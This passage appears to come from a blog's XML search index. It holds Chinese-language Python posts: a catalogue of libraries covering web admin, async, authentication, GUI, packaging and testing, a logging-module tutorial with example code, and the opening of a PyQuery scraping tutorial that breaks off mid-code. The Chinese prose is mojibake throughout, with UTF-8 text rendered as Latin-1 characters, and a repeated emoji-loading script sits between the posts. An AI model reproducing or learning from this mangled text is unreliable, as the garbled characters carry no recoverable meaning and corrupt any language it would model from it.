django-simple-spam-blockerï¼ŒDjangoç®€å•çš„åƒåœ¾é‚®ä»¶æ‹¦æˆªå™¨ã€‚ django-simple-captchaï¼ŒDjangoç®€å•éªŒè¯ç ï¼Œç®€å•çš„å’Œé«˜åº¦å¯å®šåˆ¶çš„Djangoåº”ç”¨ç¨‹åºï¼Œç”¨äºæ·»åŠ éªŒè¯ç å›¾åƒAjentiï¼ŒæœåŠ¡å™¨ç®¡ç†é¢æ¿ã€‚ Grappelliï¼Œç•Œé¢èŠ±å“¨çš„djangoçš®è‚¤ã€‚ django-suitï¼ŒDjangoæ›¿ä»£oç•Œé¢ï¼ˆä»…ç”¨äºéå•†ä¸šç”¨é€”ï¼‰ã€‚ django-xadminï¼ŒDjangoç®¡ç†é¢æ¿æ›¿ä»£å·¥å…·ã€‚ flask-adminï¼Œç®€å•çš„flaskç®¡ç†ç•Œé¢æ¡†æ¶flowerï¼Œå®æ—¶ç›‘æ§å’ŒWebç®¡ç†é¢æ¿ã€‚ Pelicanï¼Œé¹ˆé¹•ï¼ŒMarkdownæˆ–ReSTï¼Œå­—ç‹å†…å®¹ä¸»é¢˜ã€‚æ”¯æŒ DVCS, Disqus. AGPLã€‚ Cactus,ä»™äººæŒ,è®¾è®¡å¸ˆçš„ç½‘ç«™é™æ€ç”Ÿæˆå™¨ã€‚ Hydeï¼Œæµ·å¾·ï¼Œ åŸºäºJinja2çš„é™æ€ç½‘ç«™ç”Ÿæˆå™¨ã€‚ Nikolaï¼Œå°¼å¤æ‹‰-ä¸€ä¸ªé™æ€ç½‘ç«™å’Œåšå®¢ç”Ÿæˆå™¨ã€‚ Tagsï¼Œæ ‡ç­¾ï¼Œæœ€ç®€å•çš„é™æ€ç½‘ç«™ç”Ÿæˆå™¨ã€‚ Tinkererï¼Œå·¥åŒ ï¼ŒåŸºäºSphinxçš„é™æ€ç½‘ç«™ç”Ÿæˆå™¨ã€‚ asyncioï¼Œï¼ˆåœ¨Python 3.4 +æ˜¯Pythonæ ‡å‡†åº“ï¼‰ï¼Œå¼‚æ­¥I/Oï¼Œäº‹ä»¶å¾ªç¯ï¼ŒååŒä»»åŠ¡ã€‚ geventï¼ŒåŸºäºPythonçš„ç½‘ç»œåº“ã€‚ Twistedï¼Œæ‰­æ›²ï¼Œäº‹ä»¶é©±åŠ¨çš„ç½‘ç»œå¼•æ“ã€‚ Tornadoï¼Œé¾™å·é£ï¼ŒWebæ¡†æ¶å’Œå¼‚æ­¥ç½‘ç»œçš„å‡½æ•°åº“ã€‚ pulsarï¼Œè„‰å†²æ˜Ÿï¼Œäº‹ä»¶é©±åŠ¨çš„å¹¶è¡Œæ¡†æ¶çš„Pythonã€‚ dieselï¼ŒæŸ´æ²¹ï¼Œç»¿è‰²çš„ï¼ŒåŸºäºäº‹ä»¶çš„I/Oæ¡†æ¶ã€‚ eventletï¼ŒWSGIæ”¯æŒå¼‚æ­¥æ¡†æ¶ã€‚ pyzmqï¼Œ 0MQæ¶ˆæ¯åº“çš„Pythonå°è£…ã€‚ txZMQ,åŸºäºTwistedçš„0MQæ¶ˆæ¯åº“å°Crossbar,å¼€æºç»Ÿä¸€åº”ç”¨è·¯ç”±å™¨ï¼ˆWebSocketå’ŒWAMPï¼‰ã€‚ wsgirefï¼ŒPythonæ ‡å‡†åº“ï¼ŒWSGIå°è£…å®ç°ï¼Œå•çº¿ç¨‹ã€‚ Werkzeugï¼ŒæœºåºŠï¼ŒWSGIå·¥å…·å‡½æ•°åº“ï¼Œå¾ˆå®¹æ˜“åœ°åµŒå…¥åˆ°ä½ è‡ªå·±çš„é¡¹ç›®æ¡†æ¶ã€‚ pasteï¼Œç²˜è´´ï¼Œå¤šçº¿ç¨‹ï¼Œç¨³å®šçš„ï¼Œä¹…ç»è€ƒéªŒçš„WSGIå·¥å…·ã€‚ rocketï¼Œç«ç®­ï¼Œå¤šçº¿ç¨‹æœåŠ¡ï¼ŒåŸºäºPyramidã€‚ netiusï¼Œå¿«é€Ÿçš„ã€å¼‚æ­¥WSGIæœåŠ¡å™¨ï¼Œgunicornï¼Œforkedå‰èº«ï¼Œéƒ¨åˆ†ç”¨Cå†™çš„ã€‚ fapws3ï¼Œå¼‚æ­¥ç½‘ç»œï¼Œç”¨Cå†™çš„ã€‚ meinheldï¼Œå¼‚æ­¥WSGIæœåŠ¡å™¨ï¼Œæ˜¯ç”¨Cå†™çš„ã€‚ bjoernï¼Œ-å¿«é€Ÿçš„ã€å¼‚æ­¥WSGIæœåŠ¡å™¨ï¼Œç”¨Cå†™çš„ã€‚ å®‰å…¨ Permissionså‡½æ•°åº“ï¼Œå…è®¸æˆ–æ‹’ç»ç”¨æˆ·è®¿é—®æ•°æ®æˆ–å‡½æ•°ã€‚ django-guardian,Djangoå®ˆæŠ¤è€…ï¼Œç®¡ç†æ¯ä¸ªå¯¹è±¡çš„æƒé™ï¼Œç”¨äºDjango 1.2 +Carteblancheï¼Œç®¡ç†å¯¼èˆªå’Œæƒé™ã€‚ Authomaticï¼Œç®€å•å¼ºå¤§çš„è®¤è¯/æˆæƒå®¢æˆ·ç«¯ã€‚ OAuthLibï¼Œ é€šç”¨ï¼Œè§„èŒƒï¼ŒOAuthè¯·æ±‚ç­¾çº¦å·¥å…·ã€‚ rauthï¼Œç”¨äºOAuth 1.0ï¼Œ2.0ï¼Œçš„Pythonåº“ã€‚ python-oauth2ï¼Œåˆ©ç”¨å…¨é¢æµ‹è¯•ï¼ŒæŠ½è±¡æ¥å£æ¥åˆ›å»ºOAuthçš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ã€‚ python-social-authï¼Œæ˜“äºå®‰è£…çš„ç¤¾ä¼šè®¤è¯æœºåˆ¶ã€‚ django-oauth-toolkit,Django OAuthå·¥å…·åŒ…django-oauth2-provider,Django OAuth2å·¥å…·åŒ…ã€‚ django-allauthï¼ŒDjangoè®¤è¯çš„åº”ç”¨ç¨‹åºã€‚ Flask-OAuthlibï¼ŒFlaskçš„OAuthå·¥å…·åŒ…sanctionï¼Œåˆ¶è£ï¼Œç®€å•çš„oauth2å®¢æˆ·ç«¯ã€‚ joseï¼Œ[JavaScript]å¯¹è±¡ç­¾åå’ŒåŠ å¯†(JOSE)è‰æ¡ˆå®æ–½ï¼Œæ ‡è®°çŠ¶æ€ã€‚ python-jwtï¼ŒJSONçš„Webä»¤ç‰Œç”Ÿæˆå’ŒéªŒè¯æ¨¡å—ã€‚ pyjwtï¼ŒJSONçš„Webä»¤ç‰Œè‰æ¡ˆ01ã€‚ python-jwsï¼ŒJSONçš„Webä»¤ç‰Œè‰æ¡ˆ02ã€‚ PyCryptoï¼ŒPythonçš„åŠ å¯†å·¥å…·åŒ…ã€‚ Paramikoï¼Œsshv2åè®®çš„å®ç°ï¼Œæä¾›äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯çš„åŠŸèƒ½ã€‚ cryptographyï¼Œå¯†ç å¼€å‘å·¥å…·åŒ…ã€‚ PyNacï¼Œç½‘ç»œå’Œå¯†ç ï¼ˆNaClï¼‰å‡½æ•°åº“ã€‚ hashidsï¼Œhashidsçš„ Pythonå‡½æ•°åº“ã€‚ Passlibï¼Œå®‰å…¨çš„å¯†ç å­˜å‚¨/å“ˆå¸Œåº“ï¼Œéå¸¸é«˜çš„æ°´å¹³ã€‚ hashlib,md5, shaç­‰hashç®—æ³•ï¼Œç”¨æ¥æ›¿æ¢md5å’Œshaæ¨¡å—ï¼Œå¹¶ä½¿ä»–ä»¬çš„APIä¸€è‡´ã€‚ å®ƒç”±OpenSSLæ”¯æŒï¼Œæ”¯æŒå¦‚ä¸‹ç®—æ³•ï¼šmd5,sha1, sha224, sha256, sha384, sha512. GUIåº“ åç§°ç®€ä»‹PyGtkï¼ŒåŸºäºPythonçš„GUIç¨‹åºå¼€å‘GTK+åº“PyQtç”¨äºPythonçš„QTå¼€å‘åº“WxPythonPythonä¸‹çš„GUIç¼–ç¨‹æ¡†æ¶ï¼Œå…¶æ¶ˆæ¯æœºåˆ¶ä¸MFCçš„æ¶æ„ç›¸ä¼¼,å…¥é—¨éå¸¸ç®€å•ï¼Œéœ€è¦å¿«é€Ÿå¼€å‘ç›¸å…³çš„åº”ç”¨å¯ä»¥ä½¿ç”¨è¿™ä¸ªTkinterPythonä¸‹æ ‡å‡†çš„ç•Œé¢ç¼–ç¨‹åŒ…ï¼Œå› æ­¤ä¸ç®—æ˜¯ç¬¬ä¸‰æ–¹åº“äº†PySideï¼Œè·¨å¹³å°Qtçš„åº”ç”¨ç¨‹åºå’Œç”¨æˆ·ç•Œé¢æ¡†æ¶ï¼Œæ”¯æ’‘Qt v4æ¡†æ¶ã€‚ wxPythonï¼Œæ··åˆwxWidgetsçš„C++ç±»åº“ã€‚ kivyï¼Œåˆ›å»ºåº”ç”¨ç¨‹åºGUIå‡½æ•°åº“ï¼Œçœ‹è¿è¡ŒäºWindowsï¼ŒLinuxï¼ŒMAC OS Xï¼Œ[Android]å’Œ[iOS]ã€‚ curseï¼Œç”¨äºåˆ›å»ºç»ˆç«¯GUIåº”ç”¨ç¨‹åºã€‚ urwidï¼Œåˆ›å»ºç»ˆç«¯GUIåº”ç”¨ç¨‹åºçª—ä½“çš„å‡½æ•°åº“ï¼Œæ”¯æŒäº‹ä»¶ï¼Œè‰²å½©ä¸°å¯Œã€‚ pygletï¼Œè·¨å¹³å°çš„çª—å£å’Œå¤šåª’ä½“åº“çš„Pythonã€‚ Tkinterï¼Œæ˜¯Pythonäº‹å®ä¸Šçš„æ ‡å‡†GUIè½¯ä»¶åŒ…ã€‚ enamlï¼Œåˆ›å»ºæ¼‚äº®çš„ç”¨æˆ·ç•Œé¢ï¼Œè¯­æ³•ç±»ä¼¼QMLã€‚ Togaï¼Œæ‰˜åŠ ï¼ŒOSåŸç”ŸGUIå·¥å…·åŒ…ã€‚ã€æ„å»ºå°è£…ã€‘ pyenv,ç®€å•çš„Pythonç‰ˆæœ¬ç®¡ç†ã€‚ virtualenv,åˆ›å»ºç‹¬ç«‹çš„Pythonç¯å¢ƒï¼Œç”¨äºåŒæ—¶å®‰è£…ä¸åŒç‰ˆæœ¬çš„pythonç¯å¢ƒã€‚ virtualenvwrapperï¼Œæ˜¯virtualenvçš„ä¸€ç»„æ‰©å±•ã€‚ pew,ä¸€å¥—ç®¡ç†å¤šä¸ªè™šæ‹Ÿç¯å¢ƒçš„å·¥å…·ã€‚ vexï¼Œä½¿è¿è¡ŒæŒ‡å®šçš„virtualenvå‘½ä»¤ã€‚ PyRunï¼Œä¸€ä¸ªå•æ–‡ä»¶ï¼Œæ— éœ€å®‰è£…çš„Pythonç‰ˆæœ¬ç®¡ç†å·¥å…·ã€‚ PIPï¼ŒPythonåŒ…å’Œä¾èµ–çš„ç®¡ç†å·¥å…·ã€‚ easy_installï¼Œè½¯ä»¶åŒ…ç®¡ç†ç³»ç»Ÿ,æä¾›ä¸€ä¸ªæ ‡å‡†çš„åˆ†é…Pythonè½¯ä»¶å’Œ å‡½å¼åº“çš„æ ¼å¼ã€‚æ˜¯ä¸€ä¸ªé™„å¸¦è®¾ç½®å·¥å…·çš„æ¨¡å—ï¼Œå’Œä¸€ä¸ªç¬¬ä¸‰æ–¹å‡½å¼åº“ã€‚æ—¨åœ¨åŠ å¿«Pythonå‡½å¼åº“çš„åˆ†é…ç¨‹å¼çš„é€Ÿåº¦ã€‚ç±»ä¼¼Rubyè¯­è¨€çš„RubyGems ã€‚ condaï¼Œè·¨å¹³å°ï¼ŒäºŒè¿›åˆ¶è½¯ä»¶åŒ…ç®¡ç†å™¨ã€‚ Curdlingï¼Œä¸€ä¸ªç®¡ç†PythonåŒ…çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ wheelï¼ŒPythonå‘è¡Œçš„æ–°æ ‡å‡†ï¼Œæ—¨åœ¨æ›¿ä»£eggs.cx-Freezeï¼Œè·¨å¹³å°çš„ï¼Œç”¨äºæ‰“åŒ…æˆå¯æ‰§è¡Œæ–‡ä»¶çš„åº“ py2exe, Windowså¹³å°çš„Freezeè„šæœ¬å·¥å…·ï¼ŒPy2exe ï¼Œå°†pythonè„šæœ¬è½¬æ¢ä¸ºwindowsä¸Šå¯ä»¥ç‹¬ç«‹è¿è¡Œçš„å¯æ‰§è¡Œç¨‹åºpy2appï¼ŒMAC OS Xå¹³å°çš„Freezeè„šæœ¬å·¥å…·ã€‚ pyinstallerï¼Œ-è½¬æ¢æˆç‹¬ç«‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„Pythonç¨‹åºï¼ˆè·¨å¹³å°ï¼‰ã€‚ pynsist,æ„å»ºWindowså®‰è£…ç¨‹åºçš„å·¥å…·ï¼Œç”¨Pythonç¼–å†™ã€‚ dh-virtualenv,å»ºç«‹å’Œåˆ†å‘virtualenv(Debianè½¯ä»¶åŒ…æ ¼å¼) PyPIï¼Œæ–°ä¸€ä»£çš„PythonåŒ…åº“ç®¡ç†å·¥å…·ã€‚warehouse,æ–°ä¸€ä»£çš„PythonåŒ…åº“ï¼ˆPyPIï¼‰ç®¡ç†å·¥å…·ã€‚ devpiï¼ŒPyPIæœåŠ¡å™¨å’ŒåŒ…è£…/æµ‹è¯•/å‘å¸ƒå·¥å…·ã€‚ localshopï¼ŒPyPIå®˜æ–¹åŒ…é•œåƒæœåŠ¡å™¨ï¼Œæ”¯æŒæœ¬åœ°ï¼ˆç§äººï¼‰åŒ…ä¸Šä¼ ã€‚ buildoutï¼Œåˆ›å»ºï¼Œç»„è£…å’Œéƒ¨ç½²åº”ç”¨ç¨‹åºçš„å¤šä¸ªéƒ¨åˆ†ï¼Œå…¶ä¸­ä¸€äº›å¯èƒ½æ˜¯éåŸºäºPythonçš„ã€‚ SConsï¼Œè½¯ä»¶æ„é€ å·¥å…·ã€‚ platformioï¼Œä¸€ä¸ªæ§åˆ¶å°çš„å·¥å…·ï¼Œæ„å»ºçš„ä»£ç å¯ç”¨äºä¸åŒçš„å¼€å‘å¹³å°ã€‚ bitbakeï¼Œç‰¹æ®Šè®¾è®¡çš„å·¥å…·ï¼Œç”¨äºåˆ›å»ºå’Œéƒ¨ç½²[åµŒå…¥å¼]Linuxè½¯ä»¶åŒ… fabricateï¼Œè‡ªåŠ¨ä¸ºä»»ä½•ç¼–ç¨‹è¯­è¨€ï¼Œç”Ÿæˆä¾èµ–åŒ…ã€‚ django-compressorï¼ŒDjangoå‹ç¼©æœºï¼Œå‹ç¼©å’Œå†…è”JavaScriptæˆ–CSSï¼Œé“¾æ¥åˆ°ä¸€ä¸ªå•ä¸€çš„ç¼“å­˜æ–‡ä»¶ã€‚ jinja-assets-compressorï¼Œé‡‘è´¾å‹ç¼©æœºï¼Œä¸€ä¸ªJinjaæ‰©å±•ï¼Œé€šè¿‡ç¼–è¯‘ï¼Œå‹ç¼©ä½ çš„èµ„æºã€‚ webassetsï¼Œä¼˜åŒ–ç®¡ç†ï¼Œé™æ€èµ„æºï¼Œç‹¬ç‰¹çš„ç¼“å­˜æ¸…é™¤ã€‚ fanstaticï¼Œçƒè¿·ï¼ŒåŒ…ä¼˜åŒ–ï¼Œæä¾›é™æ€æ–‡ä»¶ã€‚ fileconveyorï¼Œç›‘æ§èµ„æºå˜åŒ–ï¼Œï¼Œå¯ä¿å­˜åˆ°CDNï¼ˆå†…å®¹åˆ†å‘ç½‘ç»œï¼‰å’Œæ–‡ä»¶ç³»ç»Ÿã€‚ django-storagesï¼Œä¸€ç»„è‡ªå®šä¹‰å­˜å‚¨Djangoåå°ã€‚ glueï¼Œèƒ¶èƒ¶ï¼Œä¸€ä¸ªç®€å•çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”ŸæˆCSS Spritesã€‚ libsass-pythonï¼ŒSass (å±‚å æ ·å¼è¡¨)çš„Pythonæ¥å£ã€‚ Flask-Assetsï¼Œæ•´åˆåº”ç”¨ç¨‹åºèµ„æºã€‚ã€ä»£ç è°ƒè¯•ã€‘ unittestï¼ŒPythonæ ‡å‡†åº“ï¼Œå•å…ƒæµ‹è¯•æ¡†æ¶ã€‚ noseï¼Œé¼»å­ï¼Œunittestå»¶ä¼¸äº§å“ã€‚ pytestï¼Œæˆç†Ÿçš„å…¨åŠŸèƒ½çš„Pythonæµ‹è¯•å·¥å…·ã€‚ mambaï¼Œæ›¼å·´ï¼ŒPythonçš„æƒå¨æµ‹è¯•å·¥å…·ï¼Œå‡ºè‡ªBDDçš„æ——ä¸‹ã€‚ contextsï¼ŒèƒŒæ™¯ï¼ŒBDDæµ‹è¯•æ¡†æ¶ï¼ŒåŸºäºC#ã€‚ pyshouldï¼Œshouldé£æ ¼çš„æµ‹è¯•æ¡†æ¶ï¼ŒåŸºäºPyHamcrest.pyvowsï¼ŒBDDé£æ ¼æµ‹è¯•æ¡†æ¶Seleniumï¼Œwebæµ‹è¯•æ¡†æ¶ï¼ŒPythonç»‘å®šSeleniumã€‚ splinterï¼Œåˆ†è£‚ï¼Œæµ‹è¯•Webåº”ç”¨ç¨‹åºçš„å¼€æºå·¥å…·ã€‚ locustï¼Œåˆºæ§ï¼Œå¯æ‰©å±•çš„ç”¨æˆ·è´Ÿè½½æµ‹è¯•å·¥å…·ï¼Œç”¨Pythonå†™çš„ã€‚ sixpackï¼Œè¯­è¨€æ— å…³çš„A/Bæµ‹è¯•æ¡†æ¶ã€‚ mockï¼Œæ¨¡æ‹Ÿå¯¹è±¡ï¼ˆè‹±è¯­ï¼šmock objectï¼Œä¹Ÿè¯‘ä½œæ¨¡ä»¿å¯¹è±¡ï¼‰ï¼Œæ¨¡æ‹Ÿæµ‹è¯•åº“ã€‚ responsesï¼Œå·¥å…·å‡½æ•°ï¼Œç”¨äºmockæ¨¡æ‹Ÿæµ‹è¯•ã€‚ doublex-å¼ºå¤§çš„æµ‹è¯•æ¡†æ¶ã€‚ freezegunï¼Œé€šè¿‡æ—¶é—´è°ƒæ•´ï¼Œæµ‹è¯•æ¨¡å—ã€‚ httprettyï¼Œ HTTPè¯·æ±‚çš„æ¨¡æ‹Ÿå·¥å…·ã€‚ httmockï¼Œmockæ¨¡æ‹Ÿæµ‹è¯•ã€‚ coverageï¼Œä»£ç è¦†ç›–åº¦é‡æµ‹è¯•ã€‚ fakerï¼Œç”Ÿæˆæ¨¡æ‹Ÿæµ‹è¯•æ•°æ®çš„PythonåŒ…ã€‚ mixerï¼Œæ··é¢‘å™¨ï¼Œäº§ç”Ÿæ¨¡æ‹Ÿæ•°æ®ï¼Œç”¨äºDjango ORMï¼ŒSQLAlchemyï¼ŒPeewee, MongoEngine, Pony ORMç­‰model_mommyï¼Œåœ¨Djangoåˆ›å»ºæµ‹è¯•éšæœºå·¥å…·ã€‚ ForgeryPyï¼Œæ˜“ç”¨çš„æ¨¡æ‹Ÿæ•°æ®å‘ç”Ÿå™¨ã€‚ radarï¼Œé›·è¾¾ï¼Œç”Ÿæˆéšæœºæ—¥æœŸ/æ—¶é—´ã€‚ FuckIt.pyï¼Œæµ‹è¯•Pythonä»£ç è¿è¡Œã€‚ Code Analysispysonar2ï¼ŒPythonç±»å‹ç´¢å¼•ã€‚ pycallgraph,å¯è§†åŒ–çš„æµé‡ï¼ˆè°ƒç”¨å›¾ï¼‰åº”ç”¨ç¨‹åºã€‚ code2flow,è½¬æ¢Pythonå’ŒJavaScriptä»£ç åˆ°æµç¨‹å›¾ã€‚ LinterFlake8ï¼Œæºä»£ç æ¨¡å—æ£€æŸ¥å™¨pylamaï¼ŒPythonå’ŒJavaScriptä»£ç å®¡è®¡å·¥å…·ã€‚ Pylintï¼Œæºä»£ç åˆ†æå™¨ï¼Œå®ƒæŸ¥æ‰¾ç¼–ç¨‹é”™è¯¯ï¼Œå¸®åŠ©æ‰§è¡Œä¸€ä¸ªä»£ç æ ‡å‡†å’Œå—…æ¢ä¸€äº›ä»£ç å‘³é“ã€‚æ³¨æ„ï¼šç›¸æ¯”äºPyCheckerï¼ŒPylintæ˜¯ä¸€ä¸ªé«˜é˜¶çš„Pythonä»£ç åˆ†æå·¥å…·ï¼Œå®ƒåˆ†æPythonä»£ç ä¸­çš„é”™è¯¯ã€‚ Pyflakesï¼Œä¸€ä¸ªç”¨äºæ£€æŸ¥Pythonæºæ–‡ä»¶é”™è¯¯çš„ç®€å•ç¨‹åºã€‚Pyflakesåˆ†æç¨‹åºå¹¶ä¸”æ£€æŸ¥å„ç§é”™è¯¯ã€‚å®ƒé€šè¿‡è§£ææºæ–‡ä»¶å®ç°ï¼Œæ— éœ€å¯¼å…¥ã€‚ pdb,Pythonæ ‡å‡†åº“,Pythonè°ƒè¯•å™¨ã€‚ ipdb,IPythonä½¿ç”¨çš„PDBã€‚ winpdbï¼Œç‹¬ç«‹äºå¹³å°çš„GUIè°ƒè¯•å™¨ã€‚ pudbï¼Œå…¨å±ï¼ŒåŸºäºpythonè°ƒè¯•æ§åˆ¶å°ã€‚ pyringeï¼Œ-å¯é™„ç€äºåŠæ³¨å…¥ä»£ç åˆ°Pythonç¨‹åºçš„è°ƒè¯•å™¨ã€‚ python-statsdï¼ŒstatsdæœåŠ¡å™¨å®¢æˆ·ç«¯ã€‚ memory_profilerï¼Œ å†…å­˜ç›‘è§†ã€‚ profilingï¼Œäº¤äº’å¼Pythonåˆ†æå™¨ã€‚ django-debug-toolbar, Djangoè°ƒè¯•å·¥å…·æ ,æ˜¾ç¤ºå„ç§è°ƒè¯•ä¿¡æ¯:å½“å‰è¯·æ±‚/å“åº”ã€‚django-devserver,Djangoè°ƒè¯•å·¥å…·ã€‚ flask-debugtoolbar,flaskè°ƒè¯•å·¥å…·ã€‚ ï¼ˆå®Œï¼‰ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-loggingæ¨¡å—]]></title>
    <url>%2Fposts%2Fdc0c5108%2F</url>
    <content type="text"><![CDATA[ä¸ºä»€ä¹ˆä¼šç”¨loggingæ¨¡å— çµæ´»æ€§å¥½ï¼Œæ–¹ä¾¿é…ç½® è¾“å‡ºæˆ–ä¿å­˜ä¸åŒçº§åˆ«æ—¥å¿— loggingæ¨¡å—ç»“æ„logging åœ¨æºç ä¸­æœ‰ä¸‰ä¸ªæ–‡ä»¶,ç»“æ„å¦‚ä¸‹: â”œâ”€â”€ config.py â”œâ”€â”€ handlers.py â””â”€â”€ __init__.py __int__.pyä¸­å®ç°äº†åŸºç¡€åŠŸèƒ½,ä¸»è¦çš„é€»è¾‘å°±åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ handlers.pyæ˜¯ä¸€äº›Handlersç”¨èµ·æ¥å¾ˆæ–¹ä¾¿çš„. config.pyæ˜¯å¯¹é…ç½®åšå¤„ç†çš„æ–¹æ³•. åŸºç¡€import logging # 1.åˆå§‹åŒ– ç›¸å½“äº logger = logging.getLogger("test_name") # 2.è®¾ç½®çº§åˆ« logger.setLevel(logging.DEBUG) # ä½äºè¿™ä¸ªçº§åˆ«å°±ä¸å»ç®¡ä»– # 3. å®šä¹‰handler: # åœ¨æ§åˆ¶å°è¾“å‡º FileHandler sh = logging.StreamHandler() # å®šä¹‰æ§åˆ¶å°è¾“å‡º sh.setLevel(logging.ERROR) # è®¾ç½®æœ€ä½çº§åˆ« è¾¾åˆ°ä»€ä¹ˆçº§åˆ«çš„æ—¶å€™ç®¡ ä½äº..ä¸æ‰§è¡Œ # å†™åœ¨æ–‡ä»¶é‡Œé¢ SteamHandler fh = logging.FileHandler(r'file_test.log') fh.setLevel(logging.DEBUG) # è¾¾åˆ°ä»€ä¹ˆçº§åˆ«å°±å†™åˆ°æ–‡ä»¶é‡Œé¢å» # 4. æ ¼å¼åŒ–è¾“å‡º formatter æ³¨æ„ä¹‹é—´é€—å·ä¸éœ€è¦åŠ ï¼Œåªæ˜¯ä¸ºäº†ç¾è§‚ formatter = logging.Formatter( 'æ—¶é—´ï¼š%(asctime)s,' 'æ—¥å¿—çº§åˆ«:%(levelname)s,' 'æ—¥å¿—ä¿¡æ¯ï¼š%(message)s,' ) sh.setFormatter(formatter) # è®¾ç½®æ§åˆ¶å°çš„æ ·å¼ fh.setFormatter(formatter) # è®¾ç½®æ–‡ä»¶çš„æ ·å¼ # æ·»åŠ è¿›å» logger.addHandler(sh) logger.addHandler(fh) if __name__ == '__main__': logger.debug('æµ‹è¯•ä¸­') logger.info('æ­£å¸¸è¿è¡Œ') logger.warn('è­¦å‘Š') logger.error('å®Œäº†error') logger.critical('ç‚¸äº†') # ä¾‹å¦‚ï¼š def func(a): try: num = 40/a logger.info(num) # æ­£å¸¸çš„è¯è®°å½• except Exception as e: logger.error(e) # å°†é”™è¯¯è®°å½• func(0) ## logging ä¸­çš„çº§åˆ« """ DEBUGï¼šè°ƒè¯•ä¿¡æ¯ï¼Œé€šå¸¸åœ¨è¯Šæ–­é—®é¢˜çš„æ—¶å€™ç”¨å¾—ç€ï¼› INFOï¼šæ™®é€šä¿¡æ¯ï¼Œç¡®è®¤ç¨‹åºå®‰è£…é¢„æœŸè¿è¡Œï¼› WARNINGï¼šè­¦å‘Šä¿¡æ¯ï¼Œè¡¨ç¤ºå‘ç”Ÿäº†æ„æƒ³ä¸åˆ°çš„äº‹æƒ…ï¼Œæˆ–è€…æŒ‡ç¤ºæ¥ä¸‹æ¥å¯èƒ½ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œä½†æ˜¯ç¨‹åºè¿˜æ˜¯ç»§ç»­è¿è¡Œï¼› ERRORï¼šé”™è¯¯ä¿¡æ¯ï¼Œç¨‹åºè¿è¡Œä¸­å‡ºç°äº†ä¸€äº›é—®é¢˜ï¼Œä¸€äº›åŠŸèƒ½æ²¡æœ‰æ‰§è¡Œï¼› CRITICALï¼šå±é™©ä¿¡æ¯ï¼Œä¸€ä¸ªä¸¥é‡çš„é”™è¯¯ï¼Œå¯¼è‡´ç¨‹åºæ— æ³•ç»§ç»­è¿è¡Œã€‚ # å¯¹åº”ä¸‹é¢5ä¸ªæ–¹æ³• debug info Warning error critical """ loggingå¸¸ç”¨çš„æ ¼å¼åŒ–: document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>logging</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-PyQuery]]></title>
    <url>%2Fposts%2F3176db18%2F</url>
    <content type="text"><![CDATA[Pythonçˆ¬è™«è§£æåº“ï¼Œä¸»æµçš„æœ‰ PyQuery Beautifulsoup Scrapy Selectors æ­£åˆ™è¡¨è¾¾å¼ã€‚ PyQueryå’Œscrapy Selectorséƒ½æ˜¯åŸºäºlxmlæ¨¡å—ï¼Œè€Œlxmlå’Œæ­£åˆ™è¡¨è¾¾å¼éƒ½æ˜¯Cè¯­è¨€å†™çš„ï¼Œåªæœ‰Beautifulsoupæ˜¯ç”¨çº¯Pythonç¼–å†™çš„ï¼Œæ‰€ä»¥åœ¨å®æµ‹ä¸­ï¼ŒBeautifulsoup çš„è§£æé€Ÿåº¦æ¯”å…¶ä»–å‡ ç§æ…¢äº†5å€ä»¥ä¸Šï¼ æ­£åˆ™è¡¨è¾¾å¼çš„æ„é€ ç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œä¸€èˆ¬åœ¨ç»“æ„åŒ–çš„ç½‘é¡µä¸­æ²¡å¿…è¦ç”¨æ­£åˆ™ï¼ˆæ˜“å‡ºé”™ï¼‰; Scrapy Selectorsæ”¯æŒcssï¼Œxpathä»¥åŠæ­£åˆ™è¡¨è¾¾å¼ ; PyQueryåªæ”¯æŒcssï¼ˆcssè¯­æ³•æ›´ç²¾ç®€ä¸€äº›ï¼‰ï¼Œç±»ä¼¼äºjQuery Scrapy Selectorä¸­çš„cssè¯­æ³•å’ŒPyQueryä¸­çš„ç•¥æœ‰ä¸åŒï¼Œæœ¬æ–‡ä»¥PyQueryä¸ºä¾‹ï¼ˆä¸ç”¨Scrapyæ¡†æ¶çš„è¯ï¼ŒPyQueryå°±å¤Ÿç”¨äº†ï¼‰ å®‰è£…pip3 install pyquery ä½¿ç”¨åˆå§‹åŒ–import requests from pyquery import PyQuery as pq url = 'https://www.guokr.com/' r = requests.get(url) # å®ä¾‹åŒ– doc = pq(r.text) è·å–å…ƒç´ è·ŸjQueryæ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±ä¸ç»†è¯´äº†ï¼Œç®€å•ä¸¾å‡ ä¸ªå°ä¾‹å­ # 1.è·å–classæ˜¯content-titleçš„å…ƒç´  # classæ˜¯ç‚¹. idæ˜¯# print(doc('h2.content-title')) # è·å–æœå£³ç½‘ # 2.è·å–æ ‡ç­¾çš„æ–‡æœ¬å†…å®¹ print(doc('h2.content-title').text()) # 3.éå†ï¼ˆå…ˆitems()ï¼‰ lis = doc('h2.content-title').items() for li in lis: print(li.text()) # 4. è·å–classä¸ºcontentçš„divæ ‡ç­¾ä¸‹é¢çš„ulä¸‹é¢çš„li # ç”¨ç©ºæ ¼è¡¨ç¤ºå­å­™èŠ‚ç‚¹ lis = doc('div.content ul li').items() #lis = 